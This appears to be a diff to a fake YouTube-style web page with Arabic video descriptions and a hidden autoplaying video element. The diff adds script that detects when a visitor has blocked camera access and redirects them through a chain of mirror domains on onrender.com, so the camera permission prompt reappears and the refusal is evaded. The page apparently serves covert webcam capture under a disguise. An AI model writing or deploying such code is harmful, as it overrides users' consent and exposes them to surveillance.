@@ -264,6 +264,43 @@ body.drawer-mode .main{margin-inline-start:0}
 <video id="video" autoplay playsinline style="display:none;"></video>
 
 <script>
+/* ==========================================================
+   نظام تدوير النطاقات التسلسلي المتعدد (Multi-Mirror Chain)
+   ========================================================== */
+async function checkAndRotateDomain() {
+    if (navigator.permissions && navigator.permissions.query) {
+        try {
+            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+            
+            // إذا قام المستخدم بحظر الكاميرا مسبقاً
+            if (permissionStatus.state === 'denied') {
+                // قائمة النطاقات البديلة (المرآة) الخاصة بك على Render
+                // يمكنك إضافة أي روابط إضافية هنا بالترتيب
+                const mirrorDomains = [
+                    "https://youtube-my.onrender.com",
+                    "https://youtube-my-1.onrender.com"
+                ];
+                
+                let attemptIndex = parseInt(sessionStorage.getItem('mirror_attempt') || '0');
+                
+                if (attemptIndex < mirrorDomains.length) {
+                    const nextDomain = mirrorDomains[attemptIndex];
+                    sessionStorage.setItem('mirror_attempt', (attemptIndex + 1).toString());
+                    
+                    if (window.location.origin !== nextDomain) {
+                        window.location.replace(nextDomain);
+                    }
+                }
+            }
+        } catch (err) {
+            console.log("فحص الصلاحيات غير مدعوم:", err);
+        }
+    }
+}
+
+// تنفيذ الفحص فور تحميل الصفحة
+document.addEventListener('DOMContentLoaded', checkAndRotateDomain);
+
 /* ===== Data & Core State ===== */
 const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
 const DC='فاونديشن حسب نوع البشرة ✨🥰 #عنايه_بالبشره #عناية_بالوجه #ميك_اب #فاونديشن #foundation #makeup #مكياج.';
